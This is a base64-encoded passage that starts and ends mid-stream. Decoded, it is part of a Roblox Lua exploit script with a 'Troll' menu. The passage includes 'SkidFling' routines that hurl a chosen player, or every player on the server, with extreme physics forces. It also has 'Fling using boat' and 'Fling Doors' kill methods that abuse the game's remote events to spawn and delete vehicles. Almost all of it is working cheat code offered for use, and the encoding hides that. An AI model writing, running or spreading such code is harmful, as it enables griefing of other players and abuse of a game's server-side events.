bGUpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uICogQmFzZVBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDIuMjUsIDEuNSwgLTIuMjUpICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gKiBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgLyAxLjI1LCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gKiBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgLyAxLjI1LCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCAwKSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCkgKyBUSHVtYW5vaWQuTW92ZURpcmVjdGlvbiwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIFRIdW1hbm9pZC5XYWxrU3BlZWQpLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKDkwKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgLVRIdW1hbm9pZC5XYWxrU3BlZWQpLCBDRnJhbWUuQW5nbGVzKDAsIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgVEh1bWFub2lkLldhbGtTcGVlZCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIFRSb290UGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgLyAxLjI1KSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIC1UUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSksIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCBUUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApLCBDRnJhbWUuQW5nbGVzKDAsIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKC05MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApLCBDRnJhbWUuQW5nbGVzKDAsIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgQmFzZVBhcnQuVmVsb2NpdHkuTWFnbml0dWRlID4gNTAwIG9yIEJhc2VQYXJ0LlBhcmVudCB+PSBUYXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIG9yIFRhcmdldFBsYXllci5QYXJlbnQgfj0gUGxheWVycyBvciBub3QgVGFyZ2V0UGxheWVyLkNoYXJhY3RlciA9PSBUQ2hhcmFjdGVyIG9yIFRIdW1hbm9pZC5TaXQgb3IgSHVtYW5vaWQuSGVhbHRoIDw9IDAgb3IgdGljaygpID4gVGltZSArIFRpbWVUb1dhaXQgb3IgZ2V0Z2VudigpLmZsaW5nbG9vcCA9PSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gMC8wCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQlYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICAgICAgQlYuTmFtZSA9ICJTcGVlZCIKICAgICAgICAgICAgICAgICAgICBCVi5QYXJlbnQgPSBSb290UGFydAogICAgICAgICAgICAgICAgICAgIEJWLlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICBCVi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KDEvMCwgMS8wLCAxLzApCiAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCBmYWxzZSkKCiAgICAgICAgICAgICAgICAgICAgaWYgVFJvb3RQYXJ0IGFuZCBUSGVhZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChUUm9vdFBhcnQuQ0ZyYW1lLnAgLSBUSGVhZC5DRnJhbWUucCkuTWFnbml0dWRlID4gNSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRIZWFkKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRSb290UGFydCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIFRSb290UGFydCBhbmQgbm90IFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU0ZCYXNlUGFydChUUm9vdFBhcnQpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIG5vdCBUUm9vdFBhcnQgYW5kIFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU0ZCYXNlUGFydChUSGVhZCkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgbm90IFRSb290UGFydCBhbmQgbm90IFRIZWFkIGFuZCBBY2Nlc3NvcnkgYW5kIEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNGQmFzZVBhcnQoSGFuZGxlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIEJWOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgIEh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgdHJ1ZSkKICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gSHVtYW5vaWQKCiAgICAgICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IGdldGdlbnYoKS5PbGRQb3MgKiBDRnJhbWUubmV3KDAsIC41LCAwKQogICAgICAgICAgICAgICAgICAgICAgICBDaGFyYWN0ZXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoZ2V0Z2VudigpLk9sZFBvcyAqIENGcmFtZS5uZXcoMCwgLjUsIDApKQogICAgICAgICAgICAgICAgICAgICAgICBIdW1hbm9pZDpDaGFuZ2VTdGF0ZSgiR2V0dGluZ1VwIikKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuZm9yZWFjaChDaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSwgZnVuY3Rpb24oXywgeCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHg6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4LlZlbG9jaXR5LCB4LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoKSwgVmVjdG9yMy5uZXcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICB1bnRpbCAoUm9vdFBhcnQuUG9zaXRpb24gLSBnZXRnZW52KCkuT2xkUG9zLnApLk1hZ25pdHVkZSA8IDI1CgogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSBnZXRnZW52KCkuRlBESAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgQWxsQm9vbCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgeCBpbiBuZXh0LCBQbGF5ZXJzOkdldFBsYXllcnMoKSBkbwogICAgICAgICAgICAgICAgICAgIFNraWRGbGluZyh4KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIFNraWRGbGluZyh0YXJnZXRQbGF5ZXIpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKCiAgICAgICAgd2FpdCgpCiAgICAgICAgcGNhbGwoZmxpbmdsb29wZml4KQogICAgZW5kCmVuZAoKbG9jYWwga2lsbCA9IFRyb2xsOkFkZFNlY3Rpb24oe05hbWUgPSAi8J+btu+4sUZsaW5nIEJvYXQifSkKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZsaW5nIHVzaW5nIGJvYXQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSBvciBub3QgZ2FtZS5QbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkgdGhlbgogICAgICAgICAgICB3YXJuKCLinYzvuLFObyBwbGF5ZXIgc2VsZWN0ZWQgb3IgcGxheWVyIGRvZXMgbm90IGV4aXN0LiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBDaGFyYWN0ZXIgPSBQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgSHVtYW5vaWQgPSBDaGFyYWN0ZXIgYW5kIENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCBSb290UGFydCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCBWZWhpY2xlcyA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCgogICAgICAgIGlmIG5vdCBIdW1hbm9pZCBvciBub3QgUm9vdFBhcnQgdGhlbgogICAgICAgICAgICB3YXJuKCLimqDvuI/vuLFJbnZhbGlkIEh1bWFub2lkIG9yIFJvb3RQYXJ0LiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBzcGF3bkJvYXQoKQogICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE3NTQsIC0yLCA1OCkKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpOkZpcmVTZXJ2ZXIoIlBpY2tpbmdCb2F0IiwgIk1pbGl0YXJ5Qm9hdEZyZWUiKQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgcmV0dXJuIFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikgb3Igc3Bhd25Cb2F0KCkKICAgICAgICBpZiBub3QgUENhciB0aGVuCiAgICAgICAgICAgIHdhcm4oIuKdjO+4sUZhaWxlZCB0byBzcGF3biBib2F0LiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBTZWF0ID0gUENhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBQQ2FyLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikKICAgICAgICBpZiBub3QgU2VhdCB0aGVuCiAgICAgICAgICAgIHdhcm4oIuKdjO+4sVNlYXQgbm90IGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICByZXBlYXQgCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IFNlYXQuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAxLCAwKQogICAgICAgIHVudGlsIEh1bWFub2lkLlNlYXRQYXJ0ID09IFNlYXQKCiAgICAgICAgcHJpbnQoIuKaoO+4j++4sUJvYXQgc3Bhd25lZCEiKQoKICAgICAgICBsb2NhbCBUYXJnZXRQbGF5ZXIgPSBnYW1lLlBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgIGlmIG5vdCBUYXJnZXRQbGF5ZXIgb3Igbm90IFRhcmdldFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICB3YXJuKCLinYzvuLFQbGF5ZXIgbm90IGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBUYXJnZXRDID0gVGFyZ2V0UGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIFRhcmdldEggPSBUYXJnZXRDOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGxvY2FsIFRhcmdldFJQID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgIGlmIG5vdCBUYXJnZXRSUCBvciBub3QgVGFyZ2V0SCB0aGVuCiAgICAgICAgICAgIHdhcm4oIuKdjO+4sVRhcmdldCdzIEh1bWFub2lkIG9yIFJvb3RQYXJ0IG5vdCBmb3VuZC4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgU3BpbiA9IEluc3RhbmNlLm5ldygiQm9keUFuZ3VsYXJWZWxvY2l0eSIpCiAgICAgICAgU3Bpbi5OYW1lID0gIlNwaW5uaW5nIgogICAgICAgIFNwaW4uUGFyZW50ID0gUENhci5QcmltYXJ5UGFydAogICAgICAgIFNwaW4uTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoMCwgbWF0aC5odWdlLCAwKQogICAgICAgIFNwaW4uQW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMzY5LCAwKSAKCiAgICAgICAgcHJpbnQoIkZsaW5nIGFjdGl2ZSEiKQoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBtb3ZlQ2FyKFRhcmdldFJQLCBvZmZzZXQpCiAgICAgICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICAgICAgUENhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KFRhcmdldFJQLlBvc2l0aW9uICsgb2Zmc2V0KSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBQQ2FyIGFuZCBQQ2FyLlBhcmVudCBhbmQgVGFyZ2V0UlAgYW5kIFRhcmdldFJQLlBhcmVudCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLCAwKSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoMCwgLTIuMjUsIDUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAyLjI1LCAwLjI1KSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLjUsIDApKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAtMS41LCAwKSkgIAoKICAgICAgICAgICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFJvdGF0aW9uID0gQ0ZyYW1lLkFuZ2xlcygKICAgICAgICAgICAgICAgICAgICAgICAgbWF0aC5yYWQobWF0aC5yYW5kb20oLTM2OSwgMzY5KSksICAKICAgICAgICAgICAgICAgICAgICAgICAgbWF0aC5yYWQobWF0aC5yYW5kb20oLTM2OSwgMzY5KSksIAogICAgICAgICAgICAgICAgICAgICAgICBtYXRoLnJhZChtYXRoLnJhbmRvbSgtMzY5LCAzNjkpKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBQQ2FyOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcoVGFyZ2V0UlAuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygwLCAxLjUsIDApKSAqIFJvdGF0aW9uKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgU3BpbiBhbmQgU3Bpbi5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgU3BpbjpEZXN0cm95KCkKICAgICAgICAgICAgICAgIHByaW50KCLinYzvuLFGbGluZyBkZWFjdGl2YXRlZC4iKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKcHJpbnQoIkZsaW5nIC0gQm9hdCBidXR0b24gY3JlYXRlZCIpCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJEaXNhYmxlIEZsaW5nIHVzaW5nIGJvYXQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgQ2hhcmFjdGVyID0gUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIFJvb3RQYXJ0ID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgbG9jYWwgVmVoaWNsZXMgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZXMiKQoKICAgICAgICBpZiBub3QgUm9vdFBhcnQgb3Igbm90IEh1bWFub2lkIHRoZW4KICAgICAgICAgICAgd2FybigiTm8gUm9vdFBhcnQgb3IgSHVtYW5vaWQgZm91bmQhIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIEh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSB0cnVlCiAgICAgICAgcHJpbnQoIlBsYXllciBmcm96ZW4gdG8gcmVkdWNlIHNwaW4gZWZmZWN0cy4iKQoKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFJvb3RQYXJ0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIG9iajpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciBvYmo6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHByaW50KCJTcGluIGFuZCBmb3JjZXMgcmVtb3ZlZCBmcm9tIHBsYXllci4iKQoKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcigiRGVsZXRlQWxsVmVoaWNsZXMiKQogICAgICAgIHRhc2sud2FpdCgwLjUpCgogICAgICAgIGxvY2FsIFBDYXIgPSBWZWhpY2xlcyBhbmQgVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLiJDYXIiKQogICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFBDYXIuUHJpbWFyeVBhcnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIG9iajpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciBvYmo6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBwcmludCgiU3BpbiByZW1vdmVkIGZyb20gYm9hdC4iKQogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMSkKCiAgICAgICAgbG9jYWwgc2FmZVBvcyA9IFZlY3RvcjMubmV3KDAsIDEwMDAsIDApCiAgICAgICAgbG9jYWwgYnAgPSBJbnN0YW5jZS5uZXcoIkJvZHlQb3NpdGlvbiIsIFJvb3RQYXJ0KQogICAgICAgIGJwLlBvc2l0aW9uID0gc2FmZVBvcwogICAgICAgIGJwLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKCiAgICAgICAgbG9jYWwgYmcgPSBJbnN0YW5jZS5uZXcoIkJvZHlHeXJvIiwgUm9vdFBhcnQpCiAgICAgICAgYmcuQ0ZyYW1lID0gUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgYmcuTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKCiAgICAgICAgcHJpbnQoIlBsYXllciBpcyBsb2NrZWQgYXQgYSBzYWZlIGNvb3JkaW5hdGUuIikKCiAgICAgICAgdGFzay53YWl0KDMpCgogICAgICAgIGJwOkRlc3Ryb3koKQogICAgICAgIGJnOkRlc3Ryb3koKQogICAgICAgIEh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQoKICAgICAgICBwcmludCgiUGxheWVyIHJlbGVhc2VkLCBzYWZlIGF0IHBvc2l0aW9uLiIpCiAgICBlbmQKfSkKCmxvY2FsIGtpbGwgPSBUcm9sbDpBZGRTZWN0aW9uKHtOYW1lID0gIvCflrHvuLFDbGljayBLaWxsIE1ldGhvZHMifSkKClRyb2xsOkFkZEJ1dHRvbih7CiAgTmFtZSA9ICJGbGluZyBEb29ycyAoQ2xpY2spIiwKRGVzY3JpcHRpb24gPSAi8J+ThO+4sVRvIHVzZSwgaXQncyByZWNvbW1lbmRlZCB0byBnZXQgY2xvc2UgdG8gb3RoZXIgZG9vcnMuIEFmdGVyIHRoZXkgY29tZSB0byB5b3UsIGNsaWNrIG9uIHRoZSBwbGF5ZXIgeW91IHdhbnQgdG8gZmxpbmcuIiwKICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIENoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgSFJQID0gQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgpsb2NhbCBCbGFja0hvbGUgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQpCbGFja0hvbGUuU2l6ZSA9IFZlY3RvcjMubmV3KDEwMDAwMCwgMTAwMDAwLCAxMDAwMDApCkJsYWNrSG9sZS5UcmFuc3BhcmVuY3kgPSAxCkJsYWNrSG9sZS5BbmNob3JlZCA9IHRydWUKQmxhY2tIb2xlLkNhbkNvbGxpZGUgPSBmYWxzZQpCbGFja0hvbGUuTmFtZSA9ICJCbG